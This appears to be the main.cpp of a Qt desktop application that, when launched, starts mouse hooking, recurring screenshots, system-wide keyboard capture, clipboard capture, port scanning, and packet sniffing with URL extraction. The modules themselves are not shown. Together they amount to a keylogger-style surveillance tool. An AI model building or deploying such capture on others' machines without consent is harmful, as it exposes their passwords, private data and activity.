#include "mainwindow.h"
#include "myhookmouseevent.h"
#include "takescreenshot.h"
#include "configparser.h"
#include "scannetworkports.h"
#include "systemkeyboardread.h"
#include "clipboardcapture.h"
#include "captureurls.h"

#include "capturepacketproducer.h"
#include "capturepacketconsumer.h"
#include "pcap.h"

#include <QApplication>
#include <QProcess>
#include <MyWindow.h>


int main(int argc, char *argv[])
{
    QApplication a(argc, argv);


    const int PacketsBufferSize = 50;
    QList<struct packet> PacketList;
    QSemaphore unProcessedPackets(PacketsBufferSize);
    QSemaphore processedPackets;

    MyHookMouseEvent::Instance().CaptureMouseMovement();

    TakeScreenShot *screenShot = new TakeScreenShot();
    screenShot->StartCapturingScreenShots();

    ScanNetworkPorts *scanNetworkPorts = new ScanNetworkPorts();

    SystemKeyboardRead::getInstance()->CaptureKeyEvents();

    ClipboardCapture *clipboardCapture = new ClipboardCapture();

    CapturePacketProducer producer(PacketList, unProcessedPackets, processedPackets);
    CapturePacketConsumer consumer(PacketList, unProcessedPackets, processedPackets);
    CaptureURLs *captureUrls = new CaptureURLs();


    if(captureUrls->isFeatureEnabled())
    {
        QObject::connect(&consumer, SIGNAL(SignalURLCapture(const char*)), captureUrls, SLOT(OnCaptureURLData(const char*)));
        producer.start();
        consumer.start();


    }


    return a.exec();
}
